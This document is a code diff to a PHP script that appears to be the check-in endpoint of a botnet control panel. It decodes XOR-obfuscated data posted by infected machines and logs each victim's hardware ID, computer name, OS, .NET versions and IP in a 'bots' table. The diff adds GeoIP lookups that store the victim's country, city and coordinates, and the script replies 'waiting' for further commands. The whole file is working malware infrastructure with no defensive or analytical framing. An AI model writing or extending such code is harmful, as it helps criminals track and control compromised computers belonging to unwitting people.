@@ -1,9 +1,14 @@
 <?php
+
 require_once __DIR__ . '/config.php';
+require 'vendor/autoload.php';
 include 'src/Geo/geoip.inc';
 $gi = geoip_open("src/Geo/GeoIP.dat", "");
 
 //die("uninstall");
+use GeoIp2\Database\Reader;
+
+
 
 function xor_this($data) {
 
@@ -30,12 +35,30 @@ if(empty($_POST)){
     die("404");
 }
 
+
+$reader = new Reader(__DIR__.'/src/Geo/GeoLite2-City.mmdb');
+
+
+
+
 if(!empty($_SERVER['REMOTE_ADDR'])){
     $ip = $_SERVER['REMOTE_ADDR'];
+    $record = $reader->city($ip);
     $country = geoip_country_code_by_addr($gi, $ip);
+    $countryName = $record->country->name;
+    $countryCity = $record->city->name;
+    $countryLatitude = $record->location->latitude;
+    $countryLongitude = $record->location->longitude;
 }else{
     $country = "unknow";
+    $countryLatitude = "";
+    $countryLongitude = "";
+    $countryName = "";
 }
+
+
+
+
 
 
 
@@ -99,8 +122,22 @@ if($botfound){
     }
 
 }else{
-    $statement = $pdo->prepare("INSERT INTO bots (hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-    $statement->execute(array($_POST["hwid"], xor_this($_POST["username"]), $country,  xor_this($_POST["nf2"]),  xor_this($_POST["nf3"]),  xor_this($_POST["nf35"]),  xor_this($_POST["nf4"]),$ip,  $_POST["os"],  xor_this($_POST["botversion"]))); 
+    $statement = $pdo->prepare("INSERT INTO bots (hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, latitude, longitude, countryName, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+    $statement->execute(array(
+        $_POST["hwid"], 
+        xor_this($_POST["username"]),
+        $country,  
+        xor_this($_POST["nf2"]),  
+        xor_this($_POST["nf3"]),  
+        xor_this($_POST["nf35"]),  
+        xor_this($_POST["nf4"]),
+        $countryLatitude,
+        $countryLongitude,
+        $countryName,
+        $ip, 
+        $_POST["os"],  
+        xor_this($_POST["botversion"])
+    )); 
 }
 echo "waiting";
 ?>
